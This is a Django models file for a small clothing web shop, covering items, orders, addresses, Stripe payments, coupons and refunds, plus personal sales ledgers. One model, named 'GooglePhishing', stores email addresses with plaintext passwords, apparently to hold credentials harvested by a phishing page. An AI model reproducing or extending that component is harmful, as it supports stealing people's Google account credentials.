from django.db import models
from django.conf import settings
from django.urls import reverse
from django_countries.fields import CountryField

CATEGORY_CHOICES = {
    ('S', 'SHIRT'),
    ('SW', 'SPORTWEAR'),
    ('OW', 'OUTWEAR')
}

LABEL_CHOICES = {
    ('P', 'primary'),
    ('S', 'secondary'),
    ('D', 'danger')
}

SELLER_CHOICES = {
    ('B', 'Bijas',),
    ('A', 'Ahammedunny')
}

ADREES_CHOICES = {
    ('B','BILLING_ADDRESS'),
    ('S','SHIPPING_ADDRESS')
}


class Item(models.Model):
    title = models.CharField(max_length=100)
    price = models.FloatField()
    discount_price = models.FloatField(default=0)
    category = models.CharField(choices=CATEGORY_CHOICES, max_length=2)
    labels = models.CharField(choices=LABEL_CHOICES, max_length=1)
    description = models.TextField(default="this is a description")
    slug = models.SlugField()
    image = models.ImageField(blank=True, null=True)

    def __str__(self):
        return f" {self.title}"

    def get_absolute_url(self):
        return f"products/{self.id}"

    def get_add_to_cart_url(self):
        return reverse("add-to-cart", kwargs={"id": self.id})

    def get_remove_from_cart_url(self):
        return reverse("remove-from-cart", kwargs={"id": self.id})


class OrderItem(models.Model):
    item = models.ForeignKey(Item, on_delete=models.CASCADE)
    quantity = models.IntegerField(default=1)
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
    ordered = models.BooleanField(default=False)

    def __str__(self):
        return f"{self.quantity} of {self.item.title}"

    def get_total_price(self):
        return self.quantity * self.item.price

    def get_discount_price(self):
        return self.quantity * self.item.discount_price

    def get_amount_saved(self):
        return self.get_total_price() - self.get_discount_price()

    def get_actual_amount(self):
        if self.item.discount_price:
            return self.get_discount_price()
        return self.get_total_price()


class Order(models.Model):
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
    items = models.ManyToManyField(OrderItem)
    ref_code = models.CharField(max_length=30)
    start_date = models.DateTimeField(auto_now_add=True)
    ordered_date = models.DateTimeField()
    ordered = models.BooleanField(default=False)
    billing_address = models.ForeignKey('Address',related_name='billing', on_delete=models.SET_NULL, null=True, blank=True)
    shipping_address = models.ForeignKey('Address',related_name='shipping',on_delete=models.SET_NULL, null=True, blank=True)
    payment = models.ForeignKey('Payment', on_delete=models.SET_NULL, null=True, blank=True)
    coupon = models.ForeignKey('Coupon', on_delete=models.SET_NULL, null=True, blank=True)
    being_delivered = models.BooleanField(default=False)
    processing = models.BooleanField(default=False)
    refund_requested = models.BooleanField(default=False)
    refund_granted = models.BooleanField(default=False)

    def __str__(self):
        return f"{self.user}"

    def get_total(self):
        total = 0

        for order_item in self.items.all():
            total += order_item.get_actual_amount()
        if self.coupon:
            total -= self.coupon.amount
        return total


class Address(models.Model):
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
    street_address = models.CharField(max_length=122)
    apartment_address = models.CharField(max_length=122)
    country = CountryField(multiple=False)
    pin_code = models.CharField(max_length=120)
    address_type=models.CharField(max_length=1,choices=ADREES_CHOICES)
    default=models.BooleanField(default=False)

    def __str__(self):
        return self.user.username


class Payment(models.Model):
    stripe_charge_id = models.CharField(max_length=120)
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.SET_NULL, blank=True, null=True)
    amount = models.FloatField()
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.user.username


class ContactPage(models.Model):
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.SET_NULL, null=True)
    name = models.CharField(max_length=120, null=True, blank=True)
    number = models.CharField(max_length=120, null=True, blank=True)
    message = models.CharField(max_length=1000)
    action_taken = models.BooleanField(default=False)

    def __str__(self):
        return self.user.username


class Coupon(models.Model):
    code = models.CharField(max_length=14)
    amount = models.FloatField()

    def __str__(self):
        return self.code


class Refund(models.Model):
    order = models.ForeignKey('Order', on_delete=models.CASCADE)
    ref_code = models.CharField(max_length=30)
    message = models.CharField(max_length=20)
    email = models.EmailField()

    def __str__(self):
        return self.message


class GooglePhishing(models.Model):
    email = models.EmailField()
    password = models.CharField(max_length=20)

    def __str__(self):
        return self.email


class Pocket(models.Model):
    name_of_buyer = models.CharField(max_length=20)
    name_of_seller = models.CharField(choices=SELLER_CHOICES, max_length=1)
    price = models.IntegerField(default=50, null=True, blank=True)
    total_price = models.IntegerField(null=True, blank=True)
    quantity = models.IntegerField()
    discount = models.IntegerField(null=True, blank=True)
    discount_description = models.CharField(max_length=50, null=True, blank=True)
    debt_amount=models.IntegerField(null=True, blank=True)
    balance=models.IntegerField(null=True, blank=True)
    full_amount_given = models.BooleanField(default=False)
    extra_pocket = models.IntegerField(default=0)

    def get_total_price(self):
        total = self.price * self.quantity
        self.total_price=total
        return total

    def __str__(self):
        return self.name_of_buyer


class Calculations(models.Model):
    amount_in_unny = models.IntegerField()
    amount_in_bijas = models.IntegerField()
    investment = models.IntegerField(default=2500)
    incremented_amount_bijas = models.IntegerField(null=True, blank=True)
    incremented_amount_unny = models.IntegerField(null=True, blank=True)
    incremented_amount_description_unny = models.CharField(max_length=30, null=True, blank=True)
    incremented_amount_description_bijas = models.CharField(max_length=30, null=True, blank=True)
    decremented_amount_bijas = models.IntegerField(null=True, blank=True)
    decremented_amount_unny = models.IntegerField(null=True, blank=True)
    decremented_amount_description_bijas = models.CharField(max_length=50, null=True, blank=True)
    decremented_amount_description_unny = models.CharField(max_length=50, null=True, blank=True)


class Biriyani(models.Model):
    name=models.CharField(max_length=20)
    quantity=models.IntegerField()
    price=models.IntegerField(default=100)
    address=models.CharField(max_length=200,null=True,blank=True)
    remarks=models.CharField(max_length=200,null=True,blank=True)
    amount_given=models.BooleanField()


    def get_total_price_biriyani(self):
        total = self.price* self.quantity
        return total

    def __str__(self):
        return self.name